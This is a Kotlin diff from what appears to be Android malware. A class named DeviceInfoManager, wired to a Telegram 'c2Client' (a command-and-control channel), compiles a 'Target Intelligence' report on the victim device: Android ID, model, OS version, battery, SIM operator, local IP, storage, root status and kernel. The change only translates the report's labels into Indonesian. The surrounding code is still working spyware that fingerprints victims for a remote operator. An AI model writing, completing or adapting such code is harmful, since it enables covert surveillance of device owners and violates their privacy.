@@ -26,14 +26,14 @@ class DeviceInfoManager(private val context: Context, private val c2Client: Tele
         val ipAddress = getLocalIpAddress()
 
         val specs = """
-            <b>[Target Intelligence - Professional Spec]</b>
-            🆔 <b>Android ID:</b> <code>$androidId</code>
-            📱 <b>Device:</b> ${Build.MANUFACTURER} ${Build.MODEL}
-            🤖 <b>Android Ver:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
-            🔋 <b>Battery:</b> $batteryLevel%
+            <b>[Data Intelijen - Spek Pro]</b>
+            🆔 <b>ID Android:</b> <code>$androidId</code>
+            📱 <b>Hape:</b> ${Build.MANUFACTURER} ${Build.MODEL}
+            🤖 <b>Versi Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
+            🔋 <b>Batre:</b> $batteryLevel%
             📡 <b>Operator:</b> $simOperator
-            🌐 <b>Internal IP:</b> $ipAddress
-            💾 <b>Storage:</b> ${getAvailableInternalMemorySize()} / ${getTotalInternalMemorySize()}
+            🌐 <b>IP Lokal:</b> $ipAddress
+            💾 <b>Memori:</b> ${getAvailableInternalMemorySize()} / ${getTotalInternalMemorySize()}
             🛠️ <b>Rooted:</b> ${isDeviceRooted()}
             🖥️ <b>Kernel:</b> ${System.getProperty("os.version")}
         """.trimIndent()
